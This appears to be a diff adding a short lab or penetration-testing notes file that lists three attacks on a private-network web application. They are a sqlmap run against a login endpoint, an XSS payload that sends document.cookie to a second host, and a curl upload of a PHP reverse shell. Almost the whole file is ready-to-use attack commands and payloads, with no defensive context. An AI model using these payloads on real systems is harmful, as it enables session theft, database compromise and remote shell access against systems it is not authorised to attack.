@@ -1,0 +1,18 @@
+Attack 1: SQL Injection
+
+sqlmap -u "http://192.168.4.128/api/v1/client/auth/login.php" \
+  --data="email=test@test.com&password=test" \
+  --batch \
+  --level=1 \
+  --risk=1 \
+  --threads=1
+
+================================
+Attack 2: XSS
+
+<script>new Image().src="http://192.168.4.145/log?cookie="+document.cookie;</script>
+
+================================
+Attack 3: Upload Malicious File
+
+curl -X POST -F "file=@php-reverse-shell.php" http://192.168.4.128/api/v1/files/upload.php
